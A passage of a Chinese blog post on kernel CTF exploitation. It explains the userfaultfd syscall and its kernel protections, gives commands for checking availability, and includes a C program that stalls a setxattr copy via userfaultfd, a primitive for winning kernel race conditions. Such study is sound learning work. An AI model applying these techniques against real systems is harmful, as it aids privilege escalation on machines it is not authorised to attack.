<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="以为可以一天一道题，结果看别人WP发现有各种各样不同的利用方法，于是把所有觉得还不错的方法都试着利用了一遍🫠">
<meta property="og:type" content="article">
<meta property="og:title" content="userfaultfd与setxattr在条件竞争中的利用练习">
<meta property="og:url" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/index.html">
<meta property="og:site_name" content="blingbling&#39;s blog">
<meta property="og:description" content="以为可以一天一道题，结果看别人WP发现有各种各样不同的利用方法，于是把所有觉得还不错的方法都试着利用了一遍🫠">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/Snipaste_2023-03-02_12-32-42.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/image-20230301180427383.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/image-20230225213203420.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/image-20230225194548400.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/image-20230301002128590.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/image-20230228232415377.png?size=600">
<meta property="article:published_time" content="2023-03-02T06:48:44.000Z">
<meta property="article:modified_time" content="2023-04-06T13:52:16.325Z">
<meta property="article:author" content="blingbling">
<meta property="article:tag" content="kernel pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/Snipaste_2023-03-02_12-32-42.png?size=600"><title>userfaultfd与setxattr在条件竞争中的利用练习 | blingbling's blog</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"80px","tocMaxDepth":3},
  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"dark","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: undefined,
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">关于</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">userfaultfd与setxattr在条件竞争中的利用练习</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-03-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-04-06</span></span></div></header><div class="post-body"><p>通过两个 kernel ctf 题目来理解<code>userfaultfd</code>以及<code>setxattr</code>的用法吧！</p>

        <h1 id="概念梳理"   >
          <a href="#概念梳理" class="heading-link"><i class="fas fa-link"></i></a><a href="#概念梳理" class="headerlink" title="概念梳理"></a>概念梳理</h1>
      
        <h2 id="userfaultfd系统调用"   >
          <a href="#userfaultfd系统调用" class="heading-link"><i class="fas fa-link"></i></a><a href="#userfaultfd系统调用" class="headerlink" title="userfaultfd系统调用"></a>userfaultfd系统调用</h2>
      <p>userfaultfd是linux的一个系统调用（无libc封装函数），它的出现（Linux 4.3）给用户态提供了缺页处理的能力。userfaultfd系统调用返回给用户态进程的是一个用于处理page faults的文件描述符。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html" >userfaultfd(2) - Linux manual page</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/ioctl_userfaultfd.2.html" >ioctl_userfaultfd(2) — Linux manual page</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/fs/userfaultfd.c#L2062" >SYSCALL_DEFINE1(userfaultfd, int, flags)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://blog.jcix.top/2018-10-01/userfaultfd_intro/" >从内核到用户空间(1) — 用户态缺页处理机制 userfaultfd 的使用</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="使用userfaultfd"   >
          <a href="#使用userfaultfd" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用userfaultfd" class="headerlink" title="使用userfaultfd"></a>使用userfaultfd</h3>
      <p>一个利用userfaultfd让用户态来处理缺页异常的例子（来自<code>man userfaultfd</code>）：</p>
<ol>
<li><p>通过userfaultfd系统调用创建userfaultfd object</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> uffd;</span><br><span class="line">uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br></pre></td></tr></table></div></figure></li>
<li><p>用户态进程需要先通过UFFD_API这个ioctl命令，使能userfaultfd</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">uffdio_api.api = UFFD_API;</span><br><span class="line">uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">ioctl(uffd, UFFDIO_API, &amp;uffdio_api);</span><br></pre></td></tr></table></div></figure></li>
<li><p>用户态进程通过UFFDIO_REGISTER这个ioctl命令，注册设置内存地址范围</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">char</span> *addr;  </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">addr = mmap(<span class="literal">NULL</span>, len, PROT_READ | PROT_WRITE,</span><br><span class="line">            MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">   </span><br><span class="line">uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">uffdio_register.range.len = len;</span><br><span class="line">uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register;</span><br></pre></td></tr></table></div></figure></li>
<li><p>最后用户态进程可使用UFFDIO_COPY或UFFDIO_ZEROPAGE两个ioctl命令来处理缺页异常。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">	s = pthread_create(&amp;thr, <span class="literal">NULL</span>, fault_handler_thread, (<span class="keyword">void</span> *) uffd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// fault_handler_thread()函数定义如下，梳理主要代码流程</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="comment">// 1) 创建一个page，用于缺页处理</span></span><br><span class="line">     page = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                 MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 2) 等待uffd事件到来</span></span><br><span class="line">     pollfd.fd = uffd;</span><br><span class="line">     pollfd.events = POLLIN;</span><br><span class="line">     poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 3) 从userfaultfd中读取事件信息，确认是否是缺页错误事件     </span></span><br><span class="line">     read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">     <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">         <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line">         <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4) 将准备好的数据页内容拷贝到userfaultfd注册的空间内</span></span><br><span class="line">     uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">     uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">     uffdio_copy.len = page_size;</span><br><span class="line">     uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">     uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">     ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


</li>
</ol>
<p>用户线程的处理过程是我们可控的，通过延长用户态处理时间，该系统调用可以帮助我们提高内核条件竞争成功的概率。</p>
<p><strong>防护</strong></p>
<p>userfaultfd系统调用从linux4.3开始引入，刚开始的几个版本中，对该系统调用无任何限制，所有用户均可调用。</p>
<p>linux 5.2开始，在内核中增加了一个开关，通过<code>sysctl_unprivileged_userfaultfd</code>来控制是否允许用非特权用户使用userfaultfd功能（默认情况下设置为0，不允许非特权用户使用）。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!sysctl_unprivileged_userfaultfd &amp;&amp; !capable(CAP_SYS_PTRACE))</span><br><span class="line">	<span class="keyword">return</span> -EPERM;</span><br></pre></td></tr></table></div></figure>
<p>linux 5.11开始，又增加了<code>UFFD_USER_MODE_ONLY</code>标志位，决定了userfaultfd是否仅处理用户空间的page fault。<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://lwn.net/Articles/819834/" >Blocking userfaultfd() kernel-fault handling</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 文章中指出，新版本内核中默认禁止非特权进程使用userfaultfd，非特权进程只能通过设置<code>sysctl_unprivileged_userfaultfd</code>从而安全地调用userfaultfd（只能处理用户态的缺页错误，启用<code>UFFD_USER_MODE_ONLY</code>标志着userfaultfd不允许在内核态使用）。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!sysctl_unprivileged_userfaultfd &amp;&amp;</span><br><span class="line">    (flags &amp; UFFD_USER_MODE_ONLY) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">    !capable(CAP_SYS_PTRACE)) &#123;</span><br><span class="line">	printk_once(KERN_WARNING <span class="string">&quot;uffd: Set unprivileged_userfaultfd &quot;</span></span><br><span class="line">		<span class="string">&quot;sysctl knob to 1 if kernel faults must be handled &quot;</span></span><br><span class="line">		<span class="string">&quot;without obtaining CAP_SYS_PTRACE capability\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> -EPERM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>那么，在做题过程中，如下两条命令中任何一条为1，大概率表明这个题可以使用userfaultfd。而真实系统上，还要确认<code>UFFD_USER_MODE_ONLY</code>没开。</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看内核是否支持userfaultd，出现`CONFIG_USERFAULTFD=y`表示支持</span></span><br><span class="line">grep CONFIG_USERFAULTFD /boot/config-$(uname -r)</span><br><span class="line"><span class="comment"># 查看非特权用户是否能调用userfaultfd，值为1时表示非特权用户可调用</span></span><br><span class="line">sysctl -a | grep unprivileged_userfaultfd</span><br></pre></td></tr></table></div></figure>
<p>感谢chatgpt😝</p>
<p><img   src="Snipaste_2023-03-02_12-32-42.png?size=600" style="width: 600px;"  alt="Snipaste_2023-03-02_12-32-42"></p>
<p>可以通过编译下面这段代码，确认能否使用userfaultfd。（出现<code>[+] in usefaultfd handler, i will sleep 60s\n&quot;</code>字符串打印，表明可以使用）</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc test.c -lpthread -o test</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//注册缺页错误处理</span></span><br><span class="line">    <span class="comment">//当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] waiting poll\n&quot;</span>);</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] in usefaultfd handler, i will sleep 60s\n&quot;</span>); </span><br><span class="line">    sleep(<span class="number">60</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] sleep done\n&quot;</span>);	</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">setxattr_thread</span><span class="params">(<span class="keyword">void</span>* a)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread created!\n&quot;</span>);</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>,<span class="string">&quot;bling&quot;</span>,a,<span class="number">0x200</span>,<span class="number">0</span>);  </span><br><span class="line">    <span class="comment">//char * temp = malloc(0x200);</span></span><br><span class="line">    <span class="comment">//memcpy(temp,a,0x200);</span></span><br><span class="line">    <span class="comment">//printf(&quot;end copy!\n&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *addr = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	RegisterUserfault(addr+<span class="number">0x1000</span>, userfaultfd_leak_handler);</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    pthread_create(&amp;thr, <span class="literal">NULL</span>, setxattr_thread, addr+<span class="number">0x1000</span><span class="number">-0x100</span>);</span><br><span class="line">	</span><br><span class="line">    pthread_exit(<span 